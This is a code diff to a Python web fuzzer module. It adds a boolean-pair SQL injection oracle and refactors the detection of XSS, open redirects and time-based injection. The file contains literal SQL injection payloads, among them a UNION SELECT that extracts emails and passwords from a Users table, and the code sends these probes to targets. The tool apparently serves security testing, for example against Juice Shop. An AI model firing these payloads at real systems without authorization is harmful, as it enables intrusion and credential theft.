@@ -1,14 +1,28 @@
 # backend/modules/fuzzer_core.py
 from __future__ import annotations
-import json, time, hashlib, statistics
+
+import json
+import time
+import hashlib
+import statistics
 from pathlib import Path
 from typing import Dict, Any, List, Tuple, Optional
 from urllib.parse import urlparse, urlencode, urlunparse, parse_qs, quote
 
 import httpx
-from .detectors import reflection_signals, sql_error_signal, score
+from .detectors import (
+    reflection_signals,
+    sql_error_signal,
+    score,
+    open_redirect_signal,
+    time_delay_signal,
+    boolean_divergence_signal,
+)
 
 TRUNCATE_BODY = 2048
+
+
+# ---------------------------- small utils ------------------------------------
 
 
 def _hash(s: str) -> str:
@@ -20,7 +34,7 @@ def _lower_headers(h: Dict[str, str]) -> Dict[str, str]:
         return {k.lower(): v for k, v in dict(h).items()}
     except Exception:
         # httpx Headers can be multi-dict; fallback
-        out = {}
+        out: Dict[str, str] = {}
         for k in h.keys():
             out[k.lower()] = h.get(k)
         return out
@@ -71,6 +85,9 @@ def _augment_headers(h: Dict[str, str], url: str) -> Dict[str, str]:
             out["Referer"] = ref
 
     return out
+
+
+# -------------------------- request mutation ---------------------------------
 
 
 def _apply_payload_to_target(
@@ -124,6 +141,9 @@ def _apply_payload_to_target(
     return url, headers, body
 
 
+# ------------------------------ transport ------------------------------------
+
+
 def _send_once(
     client: httpx.Client,
     method: str,
@@ -174,57 +194,7 @@ def _send(
     return last_resp, last_err, samples
 
 
-def _open_redirect_signal(resp: httpx.Response, origin_host: str) -> Dict[str, Any]:
-    """
-    Detect server-side redirects to external hosts via Location header.
-    Only meaningful when follow_redirects=False.
-    """
-    s = resp.status_code or 0
-    loc = resp.headers.get("Location") or resp.headers.get("location")
-    if not loc:
-        return {"open_redirect": False}
-    try:
-        host = urlparse(loc).netloc.lower()
-    except Exception:
-        host = ""
-    external = bool(host and host != origin_host)
-    is_redirect = s in (301, 302, 303, 307, 308)
-    return {
-        "open_redirect": bool(loc and is_redirect and external),
-        "status": s,
-        "location": loc,
-        "location_host": host,
-        "external": external,
-    }
-
-
-def _login_success_oracle(resp: httpx.Response) -> Dict[str, Any]:
-    """
-    Heuristic: Juice Shop & typical APIs return token in JSON, or set-cookie on success.
-    """
-    ok = False
-    reason = []
-    j = {}
-    try:
-        if "application/json" in (resp.headers.get("content-type", "").lower()):
-            j = resp.json()
-    except Exception:
-        j = {}
-    # token patterns
-    token = None
-    if isinstance(j, dict):
-        if "authentication" in j and isinstance(j["authentication"], dict) and "token" in j["authentication"]:
-            token = j["authentication"]["token"]
-        elif "token" in j:
-            token = j.get("token")
-    if token:
-        ok = True
-        reason.append("json_token")
-    # cookie
-    if any(h.lower() == "set-cookie" for h in resp.headers.keys()):
-        ok = True
-        reason.append("set_cookie")
-    return {"login_success": ok, "reasons": reason, "token_present": bool(token)}
+# ------------------------------- payloads ------------------------------------
 
 
 def _looks_time_based(payload: str) -> bool:
@@ -242,6 +212,37 @@ def _payload_family(p: str) -> str:
     if s.startswith(("http://", "https://", "//")) or "%2f%2f" in s:
         return "redirect"
     return "base"
+
+
+def _boolean_pairs_for(t: Dict[str, Any]) -> List[Tuple[str, str]]:
+    """
+    Generate conservative boolean TRUE/FALSE pairs regardless of context.
+    We include quoted and unquoted variants to cover both string/number sinks.
+    """
+    pairs: List[Tuple[str, str]] = []
+
+    # Quoted (string) style
+    pairs.append(("' OR '1'='1' -- ", "' OR '1'='2' -- "))
+    pairs.append(("') OR ('1'='1' -- ", "') OR ('1'='2' -- "))
+    pairs.append(('") OR ("1"="1" -- ', '") OR ("1"="2" -- '))
+
+    # Unquoted (numeric) style
+    pairs.append(("1 OR 1=1 -- ", "1 AND 1=2 -- "))
+    pairs.append((") OR (1=1) -- ", ") AND (1=2) -- "))
+
+    # URL-encoded variants (cheap coverage for query)
+    pairs.append((quote("' OR '1'='1' -- "), quote("' OR '1'='2' -- ")))
+    pairs.append((quote("1 OR 1=1 -- "), quote("1 AND 1=2 -- ")))
+
+    # Deduplicate
+    seen = set()
+    out: List[Tuple[str, str]] = []
+    for a, b in pairs:
+        key = (a, b)
+        if key not in seen:
+            out.append((a, b))
+            seen.add(key)
+    return out
 
 
 def _generate_context_aware_payloads(t: Dict[str, Any]) -> List[str]:
@@ -263,7 +264,6 @@ def _generate_context_aware_payloads(t: Dict[str, Any]) -> List[str]:
 
     # Basic SQL error / boolean probes for search-like params
     if location == "query" and param in ("q", "query", "search", "s"):
-        # raw tick & boolean, several quoting contexts
         extra = [
             "'",  # error probe
             "') AND 1=1--",
@@ -273,13 +273,12 @@ def _generate_context_aware_payloads(t: Dict[str, Any]) -> List[str]:
             ") AND 1=1--",
             ") AND 1=2--",
         ]
-        # URL-encoded variants of the two most useful ones
         extra += [quote("') AND 1=1--", safe=""), quote("') AND 1=2--", safe="")]
         auto += extra
         # Opportunistic UNION (Juice Shop-like)
         auto += ["qwert')) UNION SELECT id, email, password, '4','5','6','7','8','9' FROM Users--"]
 
-    # Open-redirect probes (augment what builder already gives us)
+    # Open-redirect probes
     if location == "query" and param in (
         "to",
         "url",
@@ -311,8 +310,76 @@ def _generate_context_aware_payloads(t: Dict[str, Any]) -> List[str]:
     return out
 
 
+# -------------------------- inference (local) --------------------------------
+
+
+def _make_detector_hits(
+    refl: Dict[str, Any],
+    sqlerr: bool,
+    openredir: bool,
+    time_sqli: bool,
+    boolean_sqli: bool,
+    hash_changed: bool,
+    repeat_consistent: bool,
+) -> Dict[str, bool]:
+    """Flattened booleans for UI & inference."""
+    return {
+        "xss_raw": bool(refl.get("raw")),
+        "xss_html_escaped": bool(refl.get("html_escaped")),
+        "xss_js": bool(refl.get("js_context")),
+        "sql_error": bool(sqlerr),
+        "open_redirect": bool(openredir),
+        "time_sqli": bool(time_sqli),
+        "boolean_sqli": bool(boolean_sqli),
+        "hash_changed": bool(hash_changed),
+        "repeat_consistent": bool(repeat_consistent),
+    }
+
+
+def _infer_class(hits: Dict[str, bool], status_delta: int, len_delta: int) -> str:
+    """
+    Deterministic, conservative inference.
+    """
+    if hits.get("sql_error") or hits.get("boolean_sqli") or hits.get("time_sqli"):
+        return "sqli"
+    if hits.get("xss_js"):
+        return "xss"
+    if hits.get("xss_raw") and not hits.get("xss_html_escaped"):
+        return "xss"
+    if hits.get("open_redirect"):
+        return "open_redirect"
+    if abs(len_delta) > 300 and status_delta >= 1:
+        return "suspicious"
+    return "none"
+
+
 def _append_evidence_line(fout, obj: Dict[str, Any]) -> None:
     fout.write(json.dumps(obj, ensure_ascii=False) + "\n")
+
+
+# ------------------------------ attempts utils --------------------------------
+
+
+def _attempt_request(
+    client: httpx.Client,
+    method: str,
+    url: str,
+    headers: Dict[str, str],
+    body: Optional[str],
+    timeout: float,
+    repeats: int,
+) -> Tuple[Optional[httpx.Response], Optional[Dict[str, str]], List[float]]:
+    return _send(client, method, url, headers, body, timeout, repeats=repeats)
+
+
+def _response_core(resp: httpx.Response) -> Tuple[str, str, int]:
+    """Return (full_text, snippet, status)."""
+    body_full = resp.text or ""
+    snippet = body_full[:TRUNCATE_BODY]
+    return body_full, snippet, resp.status_code
+
+
+# --------------------------------- main --------------------------------------
 
 
 def run_fuzz(job_dir: Path, targets_path: Path, out_dir: Optional[Path] = None) -> Path:
@@ -335,7 +402,7 @@ def run_fuzz(job_dir: Path, targets_path: Path, out_dir: Optional[Path] = None) 
 
             # CONTROL (baseline)
             u_ctrl, h_ctrl, b_ctrl = _apply_payload_to_target(t, t["control_value"], control=True)
-            r0, err0, samples0 = _send(client, method, u_ctrl, h_ctrl, b_ctrl, timeout, repeats=1)
+            r0, err0, samples0 = _attempt_request(client, method, u_ctrl, h_ctrl, b_ctrl, timeout, repeats=1)
 
             if err0 is not None:
                 # Log baseline transport failure and skip this target
@@ -357,9 +424,11 @@ def run_fuzz(job_dir: Path, targets_path: Path, out_dir: Optional[Path] = None) 
                 continue
 
             # Baseline success -> record it
-            body0_text_full = (r0.text or "")
-            body0 = body0_text_full[:TRUNCATE_BODY]
-            s0, l0 = r0.status_code, len(body0)
+            body0_full, body0_snip, s0 = _response_core(r0)  # type: ignore[arg-type]
+            l0 = len(body0_snip)
+            baseline_hash = _hash(body0_snip)
+            baseline_ms = int(statistics.median(samples0) * 1000)
+
             _append_evidence_line(
                 fout,
                 {
@@ -373,23 +442,136 @@ def run_fuzz(job_dir: Path, targets_path: Path, out_dir: Optional[Path] = None) 
                     "headers": h_ctrl,
                     "body": b_ctrl,
                     "status": s0,
-                    "length": len(body0_text_full),
-                    "elapsed_ms": int(statistics.median(samples0) * 1000),
+                    "length": len(body0_full),
+                    "elapsed_ms": baseline_ms,
                     "timing_samples_ms": [int(s * 1000) for s in samples0],
-                    "response_hash": _hash(body0),
+                    "response_hash": baseline_hash,
                 },
             )
 
             origin = _origin_host(t["url"] or "")
 
-            # TEST PAYLOADS
+            # -------------------- BOOLEAN-PAIR ORACLE PASS --------------------
+            seen_payloads: set[str] = set()
+            for p_true, p_false in _boolean_pairs_for(t):
+                # TRUE
+                u_t, h_t, b_t = _apply_payload_to_target(t, p_true, control=False)
+                r_t, err_t, smp_t = _attempt_request(client, method, u_t, h_t, b_t, timeout, repeats=1)
+                if err_t is None and r_t is not None:
+                    body_t_full, body_t_snip, st_t = _response_core(r_t)
+                    len_t = len(body_t_snip)
+                    hash_t = _hash(body_t_snip)
+                    elapsed_t = int(statistics.median(smp_t) * 1000)
+                else:
+                    body_t_full, body_t_snip, st_t = "", "", 0
+                    len_t, hash_t, elapsed_t = 0, "", 0
+
+                # FALSE
+                u_f, h_f, b_f = _apply_payload_to_target(t, p_false, control=False)
+                r_f, err_f, smp_f = _attempt_request(client, method, u_f, h_f, b_f, timeout, repeats=1)
+                if err_f is None and r_f is not None:
+                    body_f_full, body_f_snip, st_f = _response_core(r_f)
+                    len_f = len(body_f_snip)
+                    hash_f = _hash(body_f_snip)
+                    elapsed_f = int(statistics.median(smp_f) * 1000)
+                else:
+                    body_f_full, body_f_snip, st_f = "", "", 0
+                    len_f, hash_f, elapsed_f = 0, "", 0
+
+                # Log attempts
+                for (lbl, uX, hX, bX, stX, bodyX_full, bodyX_snip, elapsedX, smpX, errX, pX) in [
+                    ("attempt", u_t, h_t, b_t, st_t, body_t_full, body_t_snip, elapsed_t, smp_t, err_t, p_true),
+                    ("attempt", u_f, h_f, b_f, st_f, body_f_full, body_f_snip, elapsed_f, smp_f, err_f, p_false),
+                ]:
+                    _append_evidence_line(
+                        fout,
+                        {
+                            "type": "attempt" if errX is None else "attempt_error",
+                            "job": job_dir.name,
+                            "target_id": t["id"],
+                            "method": method,
+                            "in": t["in"],
+                            "param": t["target_param"],
+                            "url": uX,
+                            "headers": hX,
+                            "body": bX,
+                            "payload_string": pX,
+                            "payload_family_used": _payload_family(pX),
+                            "status": stX,
+                            "length": len(bodyX_full),
+                            "elapsed_ms": elapsedX,
+                            "timing_samples_ms": [int(s * 1000) for s in smpX],
+                            "response_hash": _hash(bodyX_snip),
+                            **({"error": errX} if errX is not None else {}),
+                        },
+                    )
+
+                # Compute boolean divergence
+                metrics_true = {"status": st_t, "len": len_t, "hash": hash_t}
+                metrics_false = {"status": st_f, "len": len_f, "hash": hash_f}
+                boolean_hit = boolean_divergence_signal(metrics_true, metrics_false)
+
+                if boolean_hit:
+                    # Build findings line for the pair
+                    status_delta_pair = abs(st_t - st_f)
+                    len_delta_pair = abs(len_t - len_f)
+                    ms_delta_pair = abs(elapsed_t - elapsed_f)
+
+                    findings = {
+                        "reflection": {},           # not relevant here
+                        "sql_error": False,
+                        "open_redirect": False,
+                        "boolean_sqli": True,
+                        "time_sqli": False,
+                        "hash_changed": (hash_t != hash_f),
+                        "repeat_consistent": True,
+                    }
+                    conf_pair = score(findings, status_delta_pair, len_delta_pair, ms_delta_pair)
+
+                    _append_evidence_line(
+                        fout,
+                        {
+                            "type": "finding",
+                            "oracle": "boolean_pair",
+                            "job": job_dir.name,
+                            "target_id": t["id"],
+                            "method": method,
+                            "in": t["in"],
+                            "param": t["target_param"],
+                            "url": t["url"],
+                            "content_type": t.get("content_type"),
+                            "payload_true": p_true,
+                            "payload_false": p_false,
+                            "detector_hits": {
+                                "boolean_sqli": True,
+                            },
+                            "inferred_vuln_class": "sqli",
+                            "status_delta": status_delta_pair,
+                            "len_delta": len_delta_pair,
+                            "latency_ms_delta": ms_delta_pair,
+                            "confidence": conf_pair,
+                            "request_true": {"url": u_t, "headers": h_t, "body": b_t},
+                            "request_false": {"url": u_f, "headers": h_f, "body": b_f},
+                            "response_true": {"status": st_t, "length": len(body_t_full), "elapsed_ms": elapsed_t},
+                            "response_false": {"status": st_f, "length": len(body_f_full), "elapsed_ms": elapsed_f},
+                        },
+                    )
+
+                # Avoid double-processing these in the generic loop
+                seen_payloads.add(p_true)
+                seen_payloads.add(p_false)
+
+            # -------------------- GENERIC PAYLOAD LOOP --------------------
             payloads = _generate_context_aware_payloads(t)
             for payload in payloads:
+                if payload in seen_payloads:
+                    continue  # skip ones already used for boolean pairs
+
                 u1, h1, b1 = _apply_payload_to_target(t, payload, control=False)
 
                 # Time-based probes: take median of 3 attempts
                 repeats = 3 if _looks_time_based(payload) else 1
-                r1, err1, samples = _send(client, method, u1, h1, b1, timeout, repeats=repeats)
+                r1, err1, samples = _attempt_request(client, method, u1, h1, b1, timeout, repeats=repeats)
 
                 # Always write an attempt line, even if transport failed
                 if err1 is not None:
@@ -402,8 +584,10 @@ def run_fuzz(job_dir: Path, targets_path: Path, out_dir: Optional[Path] = None) 
                             "method": method,
                             "in": t["in"],
                             "param": t["target_param"],
+                            "payload_string": payload,
+                            "payload_family_used": _payload_family(payload),
+                            # legacy for back-compat
                             "payload": payload,
-                            "payload_family": _payload_family(payload),
                             "url": u1,
                             "headers": h1,
                             "body": b1,
@@ -414,30 +598,61 @@ def run_fuzz(job_dir: Path, targets_path: Path, out_dir: Optional[Path] = None) 
                     continue
 
                 # Bodies & headers
-                body1_full = r1.text or ""
-                body1 = body1_full[:TRUNCATE_BODY]
+                body1_full, body1_snip, status1 = _response_core(r1)  # type: ignore[arg-type]
                 resp_headers = _lower_headers(r1.headers)
 
                 # Signals
                 refl = reflection_signals(body1_full, payload)
                 sqlerr = sql_error_signal(body1_full)
-                redir = _open_redirect_signal(r1, origin)
-                login_oracle = _login_success_oracle(r1)
 
-                # Deltas
-                status_delta = abs((r1.status_code or 0) - s0)
-                len_delta = abs(len(body1) - l0)
+                # Open-redirect: use detectors helper (needs Location + origin)
+                loc_hdr = resp_headers.get("location")
+                openredir = bool(open_redirect_signal(loc_hdr, origin))
+
+                # Time-delay oracle (only meaningful if we purposely sent a time payload)
                 elapsed_ms_median = int(statistics.median(samples) * 1000)
-                baseline_ms = int(statistics.median(samples0) * 1000)
+                baseline_ms = baseline_ms  # same var
+                time_sqli = _looks_time_based(payload) and time_delay_signal(baseline_ms, elapsed_ms_median)
+
+                # Hash / consistency
+                attempt_hash = _hash(body1_snip)
+                hash_changed = attempt_hash != baseline_hash
+                repeat_consistent = (len(samples) >= 2) and (statistics.pstdev(samples) * 1000.0 <= 200.0)
+
+                # Deltas vs baseline
+                status_delta = abs((status1 or 0) - s0)
+                len_delta = abs(len(body1_snip) - l0)
                 ms_delta = max(0, elapsed_ms_median - baseline_ms)
 
-                # Confidence (base)
-                conf = score({"reflection": refl, "sql_error": sqlerr}, status_delta, len_delta, ms_delta)
-                # Strong oracles bump
-                if redir.get("open_redirect"):
-                    conf = max(conf, 0.95)
-                if login_oracle.get("login_success"):
-                    conf = max(conf, 0.95)
+                # Flatten detector hits (booleans)
+                detector_hits = _make_detector_hits(
+                    refl,
+                    sqlerr,
+                    openredir,
+                    time_sqli,
+                    boolean_sqli=False,  # handled in the pair pass above
+                    hash_changed=hash_changed,
+                    repeat_consistent=repeat_consistent,
+                )
+
+                # Confidence
+                conf = score(
+                    {
+                        "reflection": refl,
+                        "sql_error": sqlerr,
+                        "open_redirect": openredir,
+                        "boolean_sqli": False,
+                        "time_sqli": time_sqli,
+                        "hash_changed": hash_changed,
+                        "repeat_consistent": repeat_consistent,
+                    },
+                    status_delta,
+                    len_delta,
+                    ms_delta,
+                )
+
+                # Inferred class (deterministic)
+                inferred = _infer_class(detector_hits, status_delta, len_delta)
 
                 # Always log the attempt (trace)
                 _append_evidence_line(
@@ -452,24 +667,34 @@ def run_fuzz(job_dir: Path, targets_path: Path, out_dir: Optional[Path] = None) 
                         "url": u1,
                         "headers": h1,
                         "body": b1,
+                        # New clear fields
+                        "payload_string": payload,
+                        "payload_family_used": _payload_family(payload),
+                        "detector_hits": detector_hits,
+                        "inferred_vuln_class": inferred,
+                        # Legacy fields to avoid breaking current UI
                         "payload": payload,
-                        "payload_family": _payload_family(payload),
-                        "status": r1.status_code,
+                        "signals": {
+                            "reflection": refl,
+                            "sql_error": sqlerr,
+                            "open_redirect": {
+                                "location": loc_hdr,
+                                "external": openredir,
+                            },
+                        },
+                        # Response meta & deltas
+                        "status": status1,
                         "length": len(body1_full),
                         "elapsed_ms": elapsed_ms_median,
                         "timing_samples_ms": [int(s * 1000) for s in samples],
                         "status_delta": status_delta,
                         "len_delta": len_delta,
                         "latency_ms_delta": ms_delta,
-                        "signals": {
-                            "reflection": refl,
-                            "sql_error": sqlerr,
-                            "open_redirect": redir,
-                            "login": login_oracle,
-                        },
+                        # Scoring
                         "confidence": conf,
-                        "response_hash": _hash(body1),
-                        "response_snippet": body1,
+                        # Evidence
+                        "response_hash": attempt_hash,
+                        "response_snippet": body1_snip,
                     },
                 )
 
@@ -478,14 +703,13 @@ def run_fuzz(job_dir: Path, targets_path: Path, out_dir: Optional[Path] = None) 
                 threshold = 0.5 if "application/json" in resp_ct else 0.6
                 should_record = (
                     conf >= threshold
-                    or sqlerr
-                    or refl.get("js_context")
-                    or refl.get("raw")
-                    or redir.get("open_redirect")
-                    or login_oracle.get("login_success")
+                    or detector_hits.get("sql_error")
+                    or detector_hits.get("xss_js")
+                    or detector_hits.get("xss_raw")
+                    or detector_hits.get("open_redirect")
+                    or detector_hits.get("time_sqli")
                 )
                 if should_record:
-                    # Back-compatible top-level (so your UI keeps working)
                     ev_top = {
                         "job": job_dir.name,
                         "target_id": t["id"],
@@ -494,24 +718,22 @@ def run_fuzz(job_dir: Path, targets_path: Path, out_dir: Optional[Path] = None) 
                         "param": t["target_param"],
                         "url": t["url"],  # original target URL
                         "content_type": t.get("content_type"),
+                        "payload_string": payload,
+                        "payload_family_used": _payload_family(payload),
+                        "detector_hits": detector_hits,
+                        "inferred_vuln_class": inferred,
+                        # Legacy
                         "payload": payload,
                         "control_value": t["control_value"],
-                        "status": r1.status_code,
+                        "status": status1,
                         "status_delta": status_delta,
                         "len_delta": len_delta,
                         "latency_ms_delta": ms_delta,
-                        "signals": {
-                            "reflection": refl,
-                            "sql_error": sqlerr,
-                            "open_redirect": redir,
-                            "login": login_oracle,
-                        },
                         "confidence": conf,
-                        "response_hash": _hash(body1),
-                        "response_snippet": body1,
+                        "response_hash": attempt_hash,
+                        "response_snippet": body1_snip,
                     }
 
-                    # Normalized request/response block (new; safer for triage & verify)
                     ev_norm = {
                         "request": {
                             "method": method,
@@ -521,7 +743,7 @@ def run_fuzz(job_dir: Path, targets_path: Path, out_dir: Optional[Path] = None) 
                             "body": b1,
                         },
                         "response": {
-                            "status": r1.status_code,
+                            "status": status1,
                             "length": len(body1_full),
                             "elapsed_ms": elapsed_ms_median,
                             "headers": {
@@ -533,7 +755,7 @@ def run_fuzz(job_dir: Path, targets_path: Path, out_dir: Optional[Path] = None) 
                         },
                     }
 
-                    ev = {**ev_top, **ev_norm}
-                    _append_evidence_line(fout, {**ev, "type": "finding"})
+                    ev = {**ev_top, **ev_norm, "type": "finding"}
+                    _append_evidence_line(fout, ev)
 
     return evidence_path
